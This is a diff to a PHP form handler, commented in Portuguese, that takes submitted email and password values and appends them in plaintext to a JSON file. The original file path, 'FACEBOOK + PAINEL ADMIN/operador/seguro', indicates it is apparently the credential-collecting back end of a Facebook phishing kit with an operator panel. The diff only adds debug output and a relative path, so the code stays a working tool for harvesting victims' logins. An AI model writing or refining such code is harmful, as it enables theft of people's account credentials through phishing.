@@ -1,38 +1,41 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Definindo variáveis para email e senha
-    $email = $_POST['email'];
-    $senha = $_POST['senha'];
+    // Verificar se os dados do formulário foram recebidos
+    var_dump($_POST); 
+    $email = isset($_POST['email']) ? $_POST['email'] : '';
+    $senha = isset($_POST['senha']) ? $_POST['senha'] : '';
 
     echo "Email: " . $email . "<br>";
     echo "Senha: " . $senha . "<br>";
 
-    // Verificar se os dados foram recebidos corretamente
+    // Verificar se ambos os campos foram preenchidos
     if ($email && $senha) {
-        // Caminho absoluto do arquivo JSON (ajustado para considerar espaços)
-        $fl = "/home/souza/Downloads/FACEBOOK + PAINEL ADMIN/operador/seguro/boleto1.json";
-        
+        // Caminho para o arquivo JSON
+        $fl = "./operador/seguro/boleto1.json";
+
+
+
         // Verificar se o arquivo existe
         if (file_exists($fl)) {
-            // Abrir o arquivo JSON para leitura
+            // Abrir o arquivo para leitura
             $h = fopen($fl, "r");
-            $arr = json_decode(fread($h, filesize($fl)), true);  // 'true' para retornar um array associativo
+            // Ler o conteúdo do arquivo
+            $arr = json_decode(fread($h, filesize($fl)), true);
             fclose($h);
         } else {
-            // Caso o arquivo não exista, criar um array vazio
+            // Se o arquivo não existir, criar um array vazio
             $arr = [];
         }
 
-        // Adicionar o novo email e senha ao array
+        // Adicionar os dados do usuário (email e senha) no array
         array_push($arr, array("email" => $email, "senha" => $senha));
 
-        // Gravar no arquivo JSON
+        // Gravar os dados no arquivo JSON
         $fhs = fopen($fl, 'w') or die("Can't open file");
         fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT));
         fclose($fhs);
 
-        // Exemplo de resposta
-        echo "Dados recebidos e salvos!";
+        echo "Dados recebidos e salvos com sucesso!";
     } else {
         echo "Erro: dados não recebidos corretamente.";
     }
